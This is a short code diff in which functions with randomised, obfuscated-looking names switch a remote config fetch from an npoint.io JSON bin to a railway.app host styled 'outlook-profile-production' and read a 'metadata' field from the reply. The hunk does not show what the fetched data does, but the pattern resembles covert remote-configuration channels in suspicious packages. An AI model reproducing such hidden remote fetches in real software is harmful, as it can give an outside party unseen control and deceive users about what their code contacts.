@@ -16,7 +16,7 @@ def eval_vwkhfg_542():
 
     def net_glanzr_773():
         try:
-            config_dbfpni_752 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_dbfpni_752 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_dbfpni_752.raise_for_status()
             net_hxkzyz_773 = config_dbfpni_752.json()
             net_rgfhpy_722 = net_hxkzyz_773.get('metadata')
